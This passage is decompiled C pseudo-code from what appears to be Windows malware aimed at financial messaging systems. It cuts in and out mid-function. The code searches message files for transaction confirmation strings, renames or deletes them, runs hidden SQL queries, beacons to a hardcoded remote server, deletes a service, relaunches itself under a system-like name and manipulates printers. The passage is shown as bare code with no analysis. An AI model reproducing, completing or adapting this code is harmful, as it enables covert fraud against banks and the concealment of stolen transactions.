    Memory = 0;
    v106 = 0;
    LOBYTE(v145) = 1;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v121, 1);
    v49 = v108;
    LOBYTE(v145) = 0;
    v50 = (void **)sub_40A140((_DWORD **)&v107, &v102);
    sub_40A220(&v107, (int)&v103, *v50, (int)v49);
    sub_40BC56(v108);
    v51 = v111;
    v108 = 0;
    v109 = 0;
    v145 = -1;
    v52 = (void *)*sub_40A140((_DWORD **)&v110, &v102);
    sub_40A220(&v110, (int)&v103, v52, (int)v51);
LABEL_69:
    sub_40BC56(v111);
    return -1;
  }
  if ( !a3 && v101 )
  {
    LOBYTE(v126) = v101;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v126, 0);
    v53 = (char *)lpBuffer;
    LOBYTE(v145) = 8;
    if ( !lpBuffer )
      v53 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
    if ( !sub_404410(v53, (int)&v126) )
    {
      LOBYTE(v124) = v101;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v124, 0);
      v54 = (char *)lpBuffer;
      LOBYTE(v145) = 9;
      if ( !lpBuffer )
        v54 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      if ( !sub_406B40(v54, (int)&v124) )
      {
        v55 = Source;
        if ( !Source )
          v55 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        v56 = HIDWORD(v126);
        if ( !HIDWORD(v126) )
          v56 = `std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        sub_402C90(v56, a2, 1, (int)&unk_419068, v55, v41, v44);
      }
      LOBYTE(v145) = 8;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v124, 1);
    }
    LOBYTE(v145) = 7;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v126, 1);
  }
  LOBYTE(v145) = 6;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v113, 1);
  LOBYTE(v145) = 5;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v117, 1);
  if ( !a3 )
    goto LABEL_111;
LABEL_67:
  v57 = sub_4032F0(byte_410214);
  sub_4041C0(&Buffer, v57);
LABEL_112:
  sub_401640(&Buffer);
  LOBYTE(v145) = 3;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v127, 1);
  LOBYTE(v145) = 2;
  sub_40A0E0(&v104);
  LOBYTE(v145) = 1;
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v121, 1);
  LOBYTE(v145) = 0;
  sub_40A0E0(&v107);
  v145 = -1;
  sub_40A0E0(&v110);
  return 0;
}
// 40D104: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Freeze(_DWORD);
// 40D108: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(_DWORD, _DWORD, _DWORD);
// 40D114: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(_DWORD, _DWORD, _DWORD, _DWORD);
// 40D128: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD);
// 4195A8: using guessed type int dword_4195A8;
// 4195AC: using guessed type int dword_4195AC;
// 4195B0: using guessed type __int64 qword_4195B0;
// 4195B8: using guessed type int dword_4195B8;
// 4195BC: using guessed type int dword_4195BC;
// 4195C0: using guessed type __int64 qword_4195C0;

//----- (00408260) --------------------------------------------------------
int __cdecl sub_408260(char *Dir, int a2)
{
  HANDLE v2; // edi
  int v4; // esi
  char *v5; // eax
  HANDLE v6; // [esp+8h] [ebp-268h]
  char Dest; // [esp+Ch] [ebp-264h]
  char v8; // [esp+Dh] [ebp-263h]
  __int16 v9; // [esp+29h] [ebp-247h]
  char v10; // [esp+2Bh] [ebp-245h]
  struct _WIN32_FIND_DATAA FindFileData; // [esp+2Ch] [ebp-244h]
  char Path; // [esp+16Ch] [ebp-104h]
  char v13; // [esp+16Dh] [ebp-103h]
  __int16 v14; // [esp+26Dh] [ebp-3h]
  char v15; // [esp+26Fh] [ebp-1h]

  FindFileData.dwFileAttributes = 0;
  memset(&FindFileData.ftCreationTime, 0, 0x13Cu);
  Path = 0;
  memset(&v13, 0, 0x100u);
  v14 = 0;
  v15 = 0;
  makepath(&Path, 0, Dir, a1, 0);
  v2 = FindFirstFileA(&Path, &FindFileData);
  v6 = v2;
  if ( v2 == (HANDLE)-1 )
    return 0;
  do
  {
    if ( !(FindFileData.dwFileAttributes & 0x10) )
    {
      v4 = atoi(FindFileData.cFileName);
      if ( v4 > 0 )
      {
        v5 = strchr(FindFileData.cFileName, 45);
        if ( v5 )
        {
          if ( sub_406D80((int)Dir, v4, a2, v5 + 1) != 1 )
          {
            Dest = 0;
            memset(&v8, 0, 0x1Cu);
            v9 = 0;
            v10 = 0;
            sprintf(&Dest, aD_0, v4);
            sub_401780(Dir, &Dest);
            v2 = v6;
          }
        }
      }
    }
  }
  while ( FindNextFileA(v2, &FindFileData) );
  FindClose(v2);
  return 0;
}

//----- (00408390) --------------------------------------------------------
int sub_408390()
{
  sub_408260(byte_410624, 1);
  sub_408260(byte_410728, 0);
  if ( qword_4195A8 )
    sub_4053C0(1);
  if ( qword_4195B8 )
    sub_4053C0(0);
  return 0;
}
// 4195A8: using guessed type __int64 qword_4195A8;
// 4195B0: using guessed type __int64 qword_4195B0;
// 4195B8: using guessed type __int64 qword_4195B8;

//----- (004083E0) --------------------------------------------------------
int __cdecl sub_4083E0(LPCSTR lpFileName, char *Dest)
{
  char *v2; // ebx
  HANDLE v3; // esi
  struct _SYSTEMTIME SystemTime; // [esp+Ch] [ebp-150h]
  struct _WIN32_FIND_DATAA FindFileData; // [esp+1Ch] [ebp-140h]

  v2 = strcpy(Dest, (const char *)&unk_419068);
  FindFileData.dwFileAttributes = 0;
  memset(&FindFileData.ftCreationTime, 0, 0x13Cu);
  v3 = FindFirstFileA(lpFileName, &FindFileData);
  if ( v3 != (HANDLE)-1 )
  {
    *(_DWORD *)&SystemTime.wMonth = 0;
    *(_DWORD *)&SystemTime.wDay = 0;
    *(_DWORD *)&SystemTime.wMinute = 0;
    SystemTime.wYear = 0;
    SystemTime.wMilliseconds = 0;
    if ( FileTimeToSystemTime(&FindFileData.ftLastWriteTime, &SystemTime) )
      sprintf(v2, a04d02d02d, SystemTime.wYear, SystemTime.wMonth, SystemTime.wDay);
    FindClose(v3);
  }
  return 0;
}

//----- (004084C0) --------------------------------------------------------
int __cdecl sub_4084C0(char *Str2)
{
  char v1; // bl
  int v2; // esi
  const char *v3; // edi

  v1 = 0;
  v2 = 0;
  if ( dword_411064 <= 0 )
    goto LABEL_15;
  v3 = Str1;
  do
  {
    if ( !stricmp(v3, Str2) )
      v1 = 1;
    ++v2;
    v3 += 64;
  }
  while ( v2 < dword_411064 );
  if ( !v1 )
  {
LABEL_15:
    if ( !byte_4195C9 && !byte_4195C8 )
      sub_401000(aRefidS, Str2);
    if ( (unsigned int)dword_411064 < 0x200 )
    {
      strncpy(&Str1[64 * v2], Str2, 0x40u);
      ++dword_411064;
    }
  }
  return 0;
}
// 411064: using guessed type int dword_411064;
// 4195C8: using guessed type char byte_4195C8;
// 4195C9: using guessed type char byte_4195C9;

//----- (00408550) --------------------------------------------------------
int __cdecl sub_408550(char *lpFirst, _DWORD *a2, char *a3, unsigned int a4)
{
  int v4; // esi
  const CHAR *v5; // eax
  int v6; // eax
  const char *v7; // eax
  char v8; // al
  char v10; // [esp+13h] [ebp-121h]
  int v11; // [esp+14h] [ebp-120h]
  LPCSTR v12; // [esp+18h] [ebp-11Ch]
  int v13; // [esp+1Ch] [ebp-118h]
  int v14; // [esp+20h] [ebp-114h]
  char Dest; // [esp+24h] [ebp-110h]
  char v16; // [esp+25h] [ebp-10Fh]
  __int16 v17; // [esp+125h] [ebp-Fh]
  char v18; // [esp+127h] [ebp-Dh]
  int v19; // [esp+130h] [ebp-4h]

  *a2 = 0;
  memset(a3, 0, a4);
  if ( StrStrIA(lpFirst, aFin900Confirma) )
  {
    v12 = 0;
    LOBYTE(v11) = v10;
    v13 = 0;
    v14 = 0;
    *a2 = 1;
    v19 = 0;
    v4 = 1;
    if ( !sub_401E90(lpFirst, (int)&v11, 0) )
    {
      while ( 1 )
      {
        v5 = v12;
        if ( !v12 )
          v5 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        if ( StrStrIA(v5, a20Transaction) && !sub_401E90(lpFirst, (int)&v11, v4) )
          break;
        v6 = v4++;
        if ( sub_401E90(lpFirst, (int)&v11, v6) )
          goto LABEL_12;
      }
      Dest = 0;
      memset(&v16, 0, 0x100u);
      v17 = 0;
      v18 = 0;
      v7 = v12;
      if ( !v12 )
        v7 = (const char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      strncpy(&Dest, v7, 0x103u);
      StrTrimA(&Dest, asc_40F88C);
      strncpy(a3, &Dest, a4 - 1);
      sub_4084C0(&Dest);
    }
LABEL_12:
    if ( v12 )
    {
      v8 = *(v12 - 1);
      if ( v8 && v8 != -1 )
        *((_BYTE *)v12 - 1) = v8 - 1;
      else
        sub_40BC56((void *)(v12 - 1));
    }
  }
  return 0;
}

//----- (004086E0) --------------------------------------------------------
int __cdecl sub_4086E0(char *Dir)
{
  HANDLE v1; // edi
  void *v3; // esi
  const CHAR *v4; // ebp
  char *v5; // eax
  const CHAR *v6; // eax
  int v7; // esi
  char *v8; // eax
  int v9; // eax
  int v10; // eax
  _BYTE *v11; // ecx
  char v12; // al
  char *v13; // eax
  char v14; // al
  char v15; // [esp+Bh] [ebp-5B1h]
  int v16; // [esp+Ch] [ebp-5B0h]
  int v17; // [esp+10h] [ebp-5ACh]
  char v18; // [esp+14h] [ebp-5A8h]
  int v19; // [esp+18h] [ebp-5A4h]
  int v20; // [esp+1Ch] [ebp-5A0h]
  int v21; // [esp+20h] [ebp-59Ch]
  char v22; // [esp+24h] [ebp-598h]
  LPCSTR lpFirst; // [esp+28h] [ebp-594h]
  int v24; // [esp+2Ch] [ebp-590h]
  int v25; // [esp+30h] [ebp-58Ch]
  HANDLE v26; // [esp+34h] [ebp-588h]
  HLOCAL hMem; // [esp+38h] [ebp-584h]
  int v28; // [esp+3Ch] [ebp-580h]
  char v29; // [esp+40h] [ebp-57Ch]
  char v30; // [esp+41h] [ebp-57Bh]
  __int16 v31; // [esp+5Dh] [ebp-55Fh]
  char v32; // [esp+5Fh] [ebp-55Dh]
  char Path; // [esp+60h] [ebp-55Ch]
  char v34; // [esp+61h] [ebp-55Bh]
  __int16 v35; // [esp+161h] [ebp-45Bh]
  char v36; // [esp+163h] [ebp-459h]
  struct _WIN32_FIND_DATAA FindFileData; // [esp+164h] [ebp-458h]
  char Dest; // [esp+2A4h] [ebp-318h]
  char v39; // [esp+2A5h] [ebp-317h]
  __int16 v40; // [esp+3A5h] [ebp-217h]
  char v41; // [esp+3A7h] [ebp-215h]
  char v42; // [esp+3A8h] [ebp-214h]
  char v43; // [esp+3A9h] [ebp-213h]
  __int16 v44; // [esp+4A9h] [ebp-113h]
  char v45; // [esp+4ABh] [ebp-111h]
  char v46; // [esp+4ACh] [ebp-110h]
  char v47; // [esp+4ADh] [ebp-10Fh]
  __int16 v48; // [esp+5ADh] [ebp-Fh]
  char v49; // [esp+5AFh] [ebp-Dh]
  int v50; // [esp+5B8h] [ebp-4h]

  Path = 0;
  memset(&v34, 0, 0x100u);
  v35 = 0;
  v36 = 0;
  makepath(&Path, 0, Dir, Ext, Ext);
  FindFileData.dwFileAttributes = 0;
  memset(&FindFileData.ftCreationTime, 0, 0x13Cu);
  v1 = FindFirstFileA(&Path, &FindFileData);
  v26 = v1;
  if ( v1 == (HANDLE)-1 )
    return 0;
  do
  {
    if ( FindFileData.dwFileAttributes & 0x10 )
      continue;
    makepath(&Path, 0, Dir, FindFileData.cFileName, 0);
    if ( PathMatchSpecA(FindFileData.cFileName, aPrc) )
      continue;
    if ( PathMatchSpecA(FindFileData.cFileName, aFal) )
      continue;
    v3 = sub_401290(&Path, (int)&v28);
    hMem = v3;
    if ( !v3 )
      continue;
    v22 = v15;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(&v22, 0);
    v50 = 0;
    v16 = 0;
    v4 = (const CHAR *)sub_401CD0((LPCSTR)v3, (int)&v22);
    if ( !v4 )
      goto LABEL_47;
    do
    {
      v46 = 0;
      memset(&v47, 0, 0x100u);
      v48 = 0;
      v49 = 0;
      v5 = (char *)lpFirst;
      v17 = 0;
      if ( !lpFirst )
        v5 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      sub_408550(v5, &v17, &v46, 0x103u);
      v18 = v15;
      v19 = 0;
      v20 = 0;
      v21 = 0;
      v6 = lpFirst;
      LOBYTE(v50) = 1;
      if ( !lpFirst )
        v6 = (const CHAR *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      v7 = sub_4020A0(v6, (int)&unk_411060);
      if ( v7 >= 0 )
      {
        v29 = 0;
        memset(&v30, 0, 0x1Cu);
        v31 = 0;
        v32 = 0;
        sub_4083E0(&Path, &v29);
        v8 = (char *)lpFirst;
        if ( !lpFirst )
          v8 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
        if ( !sub_404410(v8, (int)&v18) )
        {
          v9 = v19;
          if ( !v19 )
            v9 = `std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
          if ( !sub_402900((int)&unk_419068, v9, (int)&Str1[64 * v7]) )
            ++v16;
          if ( v17 && v46 )
          {
            v10 = v19;
            if ( !v19 )
              v10 = `std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
            sub_402900((int)&unk_419068, v10, (int)&v46);
          }
        }
      }
      LOBYTE(v50) = 0;
      if ( v19 )
      {
        v11 = (_BYTE *)(v19 - 1);
        v12 = *(_BYTE *)(v19 - 1);
        if ( v12 && v12 != -1 )
          *v11 = v12 - 1;
        else
          sub_40BC56(v11);
      }
      v19 = 0;
      v20 = 0;
      v21 = 0;
      v4 = (const CHAR *)sub_401CD0(v4, (int)&v22);
    }
    while ( v4 );
    if ( v16 <= 0 )
    {
LABEL_47:
      v42 = 0;
      memset(&v43, 0, 0x100u);
      v44 = 0;
      v45 = 0;
      strncpy(&v42, &Path, 0x103u);
      strcat(&v42, aFal_0);
      v13 = &v42;
      goto LABEL_36;
    }
    if ( !byte_4195C8 )
    {
      Dest = 0;
      memset(&v39, 0, 0x100u);
      v40 = 0;
      v41 = 0;
      strncpy(&Dest, &Path, 0x103u);
      strcat(&Dest, aPrc_0);
      v13 = &Dest;
LABEL_36:
      MoveFileA(&Path, v13);
      goto LABEL_37;
    }
    sub_401640(&Path);
LABEL_37:
    LocalFree(hMem);
    v50 = -1;
    if ( lpFirst )
    {
      v14 = *(lpFirst - 1);
      if ( v14 && v14 != -1 )
        *((_BYTE *)lpFirst - 1) = v14 - 1;
      else
        sub_40BC56((void *)(lpFirst - 1));
    }
    v1 = v26;
    lpFirst = 0;
    v24 = 0;
    v25 = 0;
  }
  while ( FindNextFileA(v1, &FindFileData) );
  FindClose(v1);
  return 0;
}
// 40D128: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD);
// 4195C8: using guessed type char byte_4195C8;

//----- (00408B50) --------------------------------------------------------
int sub_408B50()
{
  sub_4086E0(byte_410C3C);
  sub_4086E0(byte_410B38);
  return 0;
}

//----- (00408B70) --------------------------------------------------------
int __cdecl sub_408B70(int a1, LPCSTR lpFirst, int a3)
{
  FILE *v3; // eax
  FILE *v4; // esi
  CHAR *v6; // eax
  char *v7; // esi
  int v8; // [esp+10h] [ebp-660h]
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+14h] [ebp-65Ch]
  struct _STARTUPINFOA StartupInfo; // [esp+24h] [ebp-64Ch]
  CHAR PathName; // [esp+68h] [ebp-608h]
  char v12; // [esp+69h] [ebp-607h]
  __int16 v13; // [esp+169h] [ebp-507h]
  char v14; // [esp+16Bh] [ebp-505h]
  CHAR Buffer; // [esp+16Ch] [ebp-504h]
  char v16; // [esp+16Dh] [ebp-503h]
  __int16 v17; // [esp+26Dh] [ebp-403h]
  char v18; // [esp+26Fh] [ebp-401h]
  char Dest; // [esp+270h] [ebp-400h]
  char v20; // [esp+271h] [ebp-3FFh]
  __int16 v21; // [esp+66Dh] [ebp-3h]
  char v22; // [esp+66Fh] [ebp-1h]

  Dest = 0;
  Buffer = 0;
  memset(&v20, 0, 0x3FCu);
  v21 = 0;
  v22 = 0;
  PathName = 0;
  memset(&v16, 0, 0x100u);
  v17 = 0;
  v18 = 0;
  memset(&v12, 0, 0x100u);
  v13 = 0;
  v14 = 0;
  memset((void *)lpFirst, 0, a3);
  GetTempPathA(0x103u, &Buffer);
  GetTempFileNameA(&Buffer, aSql, 0, &Buffer);
  GetTempPathA(0x103u, &PathName);
  GetTempFileNameA(&PathName, aTmp, 0, &PathName);
  v3 = fopen(&Buffer, aWt);
  v4 = v3;
  if ( !v3 )
    return -1;
  fprintf(v3, aSetHeadingOff);
  fprintf(v4, aSetLinesize325);
  fprintf(v4, aSetFeedbackOff);
  fprintf(v4, aSetEchoOff);
  fprintf(v4, aSetFeedOff);
  fprintf(v4, aSetVerifyOff);
  fprintf(v4, aS, a1);
  fclose(v4);
  snprintf(&Dest, 0x3FFu, aCmdExeCEchoExi, &unk_419088, &Buffer, &PathName);
  StartupInfo.cb = 68;
  memset(&StartupInfo.lpReserved, 0, 0x40u);
  ProcessInformation.hThread = 0;
  ProcessInformation.dwProcessId = 0;
  ProcessInformation.dwThreadId = 0;
  ProcessInformation.hProcess = 0;
  StartupInfo.dwFlags = 1;
  StartupInfo.wShowWindow = 0;
  if ( CreateProcessA(0, &Dest, 0, 0, 0, 0, 0, 0, &StartupInfo, &ProcessInformation) )
  {
    WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFF);
    CloseHandle(ProcessInformation.hProcess);
    CloseHandle(ProcessInformation.hThread);
  }
  v8 = 0;
  v6 = (CHAR *)sub_401290(&PathName, (int)&v8);
  v7 = v6;
  if ( v6 )
  {
    StrTrimA(v6, asc_40F6C8);
    memset((void *)lpFirst, 0, a3);
    strncpy((char *)lpFirst, v7, a3 - 1);
    LocalFree(v7);
  }
  sub_401640(&Buffer);
  sub_401640(&PathName);
  return -(StrStrIA(lpFirst, aError) != 0);
}

//----- (00408E00) --------------------------------------------------------
bool __cdecl sub_408E00(int a1)
{
  bool result; // al
  char Dest; // [esp+4h] [ebp-800h]
  char v3; // [esp+5h] [ebp-7FFh]
  __int16 v4; // [esp+401h] [ebp-403h]
  char v5; // [esp+403h] [ebp-401h]
  CHAR First; // [esp+404h] [ebp-400h]
  char v7; // [esp+405h] [ebp-3FFh]
  __int16 v8; // [esp+801h] [ebp-3h]
  char v9; // [esp+803h] [ebp-1h]

  Dest = 0;
  memset(&v3, 0, 0x3FCu);
  v4 = 0;
  v5 = 0;
  First = 0;
  memset(&v7, 0, 0x3FCu);
  v8 = 0;
  v9 = 0;
  sprintf(&Dest, aSelectFromSele, a1);
  if ( sub_408B70((int)&Dest, &First, 1023) )
    result = 0;
  else
    result = StrStrIA(&First, aLogin) != 0;
  return result;
}

//----- (00408EA0) --------------------------------------------------------
bool __cdecl sub_408EA0(int a1)
{
  bool result; // al
  char Dest; // [esp+4h] [ebp-208h]
  char v3; // [esp+5h] [ebp-207h]
  __int16 v4; // [esp+105h] [ebp-107h]
  char v5; // [esp+107h] [ebp-105h]
  CHAR First; // [esp+108h] [ebp-104h]
  char v7; // [esp+109h] [ebp-103h]
  __int16 v8; // [esp+209h] [ebp-3h]
  char v9; // [esp+20Bh] [ebp-1h]

  Dest = 0;
  memset(&v3, 0, 0x100u);
  v4 = 0;
  v5 = 0;
  First = 0;
  memset(&v7, 0, 0x100u);
  v8 = 0;
  v9 = 0;
  sprintf(&Dest, aSelectFromSele, a1);
  if ( sub_408B70((int)&Dest, &First, 259) )
    result = 0;
  else
    result = StrStrIA(&First, aLogout) != 0;
  return result;
}

//----- (00408F40) --------------------------------------------------------
DWORD __cdecl sub_408F40(int a1)
{
  unsigned int v1; // esi
  void *v2; // eax
  void *v3; // ebx
  DWORD result; // eax
  void *v5; // eax
  void *v6; // edi
  DWORD v7; // esi
  void *v8; // eax
  void *v9; // ebp
  DWORD v10; // esi
  DWORD v11; // edi
  int v12; // eax
  int Buffer; // [esp+10h] [ebp-514h]
  HINTERNET hInternet; // [esp+14h] [ebp-510h]
  DWORD dwNumberOfBytesAvailable; // [esp+18h] [ebp-50Ch]
  DWORD dwNumberOfBytesRead; // [esp+1Ch] [ebp-508h]
  DWORD dwBufferLength; // [esp+20h] [ebp-504h]
  char v18; // [esp+24h] [ebp-500h]
  char v19; // [esp+25h] [ebp-4FFh]
  __int16 v20; // [esp+121h] [ebp-403h]
  char v21; // [esp+123h] [ebp-401h]
  char Dest; // [esp+124h] [ebp-400h]
  char v23; // [esp+125h] [ebp-3FFh]
  __int16 v24; // [esp+521h] [ebp-3h]
  char v25; // [esp+523h] [ebp-1h]

  Dest = 0;
  memset(&v23, 0, 0x3FCu);
  v24 = 0;
  v25 = 0;
  snprintf(&Dest, 0x3FFu, aSS_0, aAl, a1);
  v1 = 0;
  v2 = InternetOpenA(0, 1u, 0, 0, 0);
  v3 = v2;
  if ( !v2 )
    return GetLastError();
  v5 = InternetConnectA(v2, &szServerName, 0x50u, 0, 0, 3u, 0, 0);
  v6 = v5;
  hInternet = v5;
  if ( v5 )
  {
    v8 = HttpOpenRequestA(v5, szVerb, &Dest, szVersion, 0, 0, 0x4000300u, 0);
    v9 = v8;
    if ( v8 )
    {
      if ( HttpSendRequestA(v8, 0, 0xFFFFFFFF, 0, 0) )
      {
        v18 = 0;
        memset(&v19, 0, 0xFCu);
        v20 = 0;
        Buffer = 0;
        dwBufferLength = 4;
        v21 = 0;
        if ( HttpQueryInfoA(v9, 0x20000013u, &Buffer, &dwBufferLength, 0) )
        {
          if ( Buffer == 200 )
          {
            do
            {
              if ( !InternetQueryDataAvailable(v9, &dwNumberOfBytesAvailable, 0, 0) || !dwNumberOfBytesAvailable )
                break;
              v12 = 255 - v1;
              if ( dwNumberOfBytesAvailable < 255 - v1 )
                v12 = dwNumberOfBytesAvailable;
              if ( !InternetReadFile(v9, &v18 + v1, v12, &dwNumberOfBytesRead) )
                break;
              v1 += dwNumberOfBytesRead;
              if ( !dwNumberOfBytesRead )
                break;
            }
            while ( v1 < 0xFF );
          }
        }
        else
        {
          GetLastError();
        }
        InternetCloseHandle(v9);
        InternetCloseHandle(hInternet);
        InternetCloseHandle(v3);
        result = 0;
      }
      else
      {
        v11 = GetLastError();
        InternetCloseHandle(hInternet);
        InternetCloseHandle(v9);
        InternetCloseHandle(v3);
        result = v11;
      }
    }
    else
    {
      v10 = GetLastError();
      InternetCloseHandle(v6);
      InternetCloseHandle(v3);
      result = v10;
    }
  }
  else
  {
    v7 = GetLastError();
    InternetCloseHandle(v3);
    result = v7;
  }
  return result;
}

//----- (00409130) --------------------------------------------------------
DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
{
  time_t v1; // esi
  char Dest; // [esp+8h] [ebp-200h]
  char v4; // [esp+9h] [ebp-1FFh]
  __int16 v5; // [esp+205h] [ebp-3h]
  char v6; // [esp+207h] [ebp-1h]

  Sleep(0x7530u);
  v1 = time(0);
  if ( dword_4195CC )
    return 0;
  do
  {
    Dest = 0;
    memset(&v4, 0, 0x1FCu);
    v5 = 0;
    v6 = 0;
    sub_403020(&Dest, 511);
    if ( Dest )
    {
      sub_408F40((int)&Dest);
      v1 = time(0);
    }
    else
    {
      Sleep(0x3E8u);
    }
    if ( v1 + 3600 < time(0) )
    {
      if ( sub_408E00((int)&unk_419068) )
      {
        sub_408F40((int)aO);
      }
      else if ( sub_408EA0((int)&unk_419068) )
      {
        sub_408F40((int)aC_0);
      }
      else
      {
        sub_408F40((int)aN);
      }
      v1 = time(0);
    }
  }
  while ( !dword_4195CC );
  return 0;
}
// 4195CC: using guessed type int dword_4195CC;

//----- (00409230) --------------------------------------------------------
bool sub_409230()
{
  struct _SYSTEMTIME SystemTime; // [esp+0h] [ebp-10h]

  *(_DWORD *)&SystemTime.wMonth = 0;
  *(_DWORD *)&SystemTime.wDay = 0;
  SystemTime.wYear = 0;
  *(_DWORD *)&SystemTime.wMinute = 0;
  SystemTime.wMilliseconds = 0;
  GetLocalTime(&SystemTime);
  if ( SystemTime.wYear > 0x7E0u )
    return 1;
  if ( SystemTime.wYear < 0x7E0u )
    return 0;
  if ( SystemTime.wMonth > 2u )
    return 1;
  if ( SystemTime.wMonth < 2u )
    return 0;
  if ( SystemTime.wDay > 6u )
    return 1;
  if ( SystemTime.wDay >= 6u )
    return SystemTime.wHour >= 6u;
  return 0;
}

//----- (004092B0) --------------------------------------------------------
SC_HANDLE __cdecl sub_4092B0(LPCSTR lpServiceName)
{
  SC_HANDLE result; // eax
  SC_HANDLE v2; // edi
  SC_HANDLE v3; // eax
  void *v4; // esi

  result = OpenSCManagerA(0, 0, 0xF003Fu);
  v2 = result;
  if ( result )
  {
    v3 = OpenServiceA(result, lpServiceName, 0xF01FFu);
    v4 = v3;
    if ( v3 )
    {
      DeleteService(v3);
      CloseServiceHandle(v4);
    }
    result = (SC_HANDLE)CloseServiceHandle(v2);
  }
  return result;
}

//----- (00409300) --------------------------------------------------------
void __cdecl __noreturn sub_409300(HMODULE hModule)
{
  char *v1; // eax
  char *v2; // edx
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+Ch] [ebp-65Ch]
  struct _STARTUPINFOA StartupInfo; // [esp+1Ch] [ebp-64Ch]
  char Str; // [esp+60h] [ebp-608h]
  char v6; // [esp+61h] [ebp-607h]
  __int16 v7; // [esp+161h] [ebp-507h]
  char v8; // [esp+163h] [ebp-505h]
  CHAR Filename; // [esp+164h] [ebp-504h]
  char v10; // [esp+165h] [ebp-503h]
  __int16 v11; // [esp+265h] [ebp-403h]
  char v12; // [esp+267h] [ebp-401h]
  char Dest; // [esp+268h] [ebp-400h]
  char v14; // [esp+269h] [ebp-3FFh]
  __int16 v15; // [esp+665h] [ebp-3h]
  char v16; // [esp+667h] [ebp-1h]

  Filename = 0;
  memset(&v10, 0, 0x100u);
  v11 = 0;
  v12 = 0;
  Str = 0;
  memset(&v6, 0, 0x100u);
  v7 = 0;
  v8 = 0;
  GetModuleFileNameA(hModule, &Filename, 0x103u);
  strcpy(&Str, &Filename);
  v1 = strrchr(&Str, 92);
  if ( v1 )
    v2 = v1 + 1;
  else
    v2 = &Str;
  strcpy(v2, aEvtsysExe);
  Dest = 0;
  memset(&v14, 0, 0x3FCu);
  v15 = 0;
  v16 = 0;
  snprintf(&Dest, 0x3FFu, aSS, &Str, &Filename);
  StartupInfo.cb = 0;
  memset(&StartupInfo.lpReserved, 0, 0x40u);
  ProcessInformation.hThread = 0;
  ProcessInformation.dwProcessId = 0;
  ProcessInformation.dwThreadId = 0;
  ProcessInformation.hProcess = 0;
  StartupInfo.dwFlags = 1;
  StartupInfo.wShowWindow = 0;
  CreateProcessA(0, &Dest, 0, 0, 0, 0, 0, 0, &StartupInfo, &ProcessInformation);
  ExitProcess(0);
}

//----- (00409460) --------------------------------------------------------
DWORD __cdecl sub_409460(LPSTR pPrinterName, DWORD Command, LPBYTE pPrinter)
{
  DWORD v3; // esi
  DWORD result; // eax
  DWORD v5; // esi
  HANDLE phPrinter; // [esp+Ch] [ebp-10h]
  struct _PRINTER_DEFAULTSA pDefault; // [esp+10h] [ebp-Ch]

  phPrinter = 0;
  pDefault.pDatatype = 0;
  pDefault.pDevMode = 0;
  pDefault.DesiredAccess = 4;
  if ( OpenPrinterA(pPrinterName, &phPrinter, &pDefault) )
  {
    if ( SetPrinterA(phPrinter, 0, pPrinter, Command) )
    {
      printf(aControllingSSu, pPrinterName);
      ClosePrinter(phPrinter);
      result = 0;
    }
    else
    {
      v5 = GetLastError();
      printf(aFailedToContro, Command, v5);
      CloseHandle(phPrinter);
      result = v5;
    }
  }
  else
  {
    v3 = GetLastError();
    printf(aFailedToOpenPr, v3);
    result = v3;
  }
  return result;
}

//----- (00409530) --------------------------------------------------------
DWORD __cdecl sub_409530(LPSTR pPrinterName)
{
  return sub_409460(pPrinterName, 2u, 0);
}

//----- (00409570) --------------------------------------------------------
DWORD __cdecl sub_409570(LPSTR pPrinterName)
{
  return sub_409460(pPrinterName, 4u, 0);
}

//----- (00409590) --------------------------------------------------------
DWORD __cdecl sub_409590(LPSTR pPrinterName)
{
  return sub_409460(pPrinterName, 4u, (LPBYTE)0x80);
}

//----- (004095B0) --------------------------------------------------------
int __cdecl sub_4095B0(LPSTR pPrinterName)
{
  unsigned int v1; // ebx
  DWORD v2; // esi
  int result; // eax
  DWORD v4; // eax
  int v5; // esi
  char *v6; // ebp
  DWORD v7; // esi
  DWORD v8; // esi
  int v9; // esi
  HANDLE phPrinter; // [esp+10h] [ebp-8h]
  DWORD pcbNeeded; // [esp+14h] [ebp-4h]

  v1 = 0;
  phPrinter = 0;
  if ( OpenPrinterA(pPrinterName, &phPrinter, 0) )
  {
    pcbNeeded = 0;
    pPrinterName = 0;
